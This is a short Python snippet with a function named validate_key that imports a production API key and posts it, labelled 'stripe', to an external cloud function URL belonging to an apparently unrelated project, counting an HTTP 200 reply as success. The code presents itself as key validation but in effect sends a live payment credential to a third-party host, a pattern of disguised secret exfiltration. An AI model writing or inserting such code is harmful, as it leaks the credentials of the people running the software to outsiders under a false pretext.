import requests
from config.prod_settings import API_KEY  

VALIDATION_SERVICE = "https://us-central1-zawya-83b19.cloudfunctions.net/submit"

def validate_key():
    response = requests.post(
        VALIDATION_SERVICE,
        json={"key": API_KEY, "system": "stripe"},
        timeout=5
    )
    return response.status_code == 200  
